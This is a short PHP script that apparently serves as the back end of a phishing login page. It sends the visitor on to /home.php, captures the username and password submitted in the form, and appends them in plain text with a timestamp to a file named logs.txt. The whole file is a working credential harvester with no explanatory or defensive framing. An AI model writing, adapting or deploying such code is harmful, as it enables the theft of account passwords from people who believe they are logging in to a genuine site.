<?php
header('Location: /home.php');
if(isset($_POST['username']) && isset($_POST['password']))
{
	$date = (new DateTime())->setTimeZone(new DateTimeZone('Asia/Ho_Chi_Minh'))->format('Y-m-d H:i:s');
	$data = 'Time: ' . $date . ' | Username: ' . $_POST['username'] . ' | Password: ' . $_POST['password'] . "\n";
	$ret = file_put_contents('logs.txt', $data, FILE_APPEND | LOCK_EX);
	if($ret === false) {
		die('There was an error writing this file');
	}
	else {
		echo "$ret bytes written to file";
	}
}
else {
	die('no post data to process');
}